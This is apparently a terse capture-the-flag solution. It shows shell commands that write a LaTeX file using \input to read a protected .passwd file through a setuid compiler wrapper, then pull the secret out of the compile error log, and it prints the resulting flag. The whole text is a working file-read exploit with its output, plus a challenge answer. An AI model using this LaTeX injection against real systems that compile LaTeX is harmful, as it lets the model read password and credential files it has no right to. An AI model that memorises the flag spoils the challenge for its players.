
```
echo "\documentclass{article}
\begin{document}
\catcode `\%=12
\input{/challenge/app-script/ch23/.passwd}
\end{document}" > /tmp/exp
```

```
./setuid-wrapper /tmp/exp
```
	[+] Compilation ...
	[!] Compilation error, your logs : /tmp/tmp.nGEha9a20M/main.log

```
cat /tmp/tmp.nGEha9a20M/main.log
```
	LaTeX_1nput_1s_n0t_v3ry_s3kur3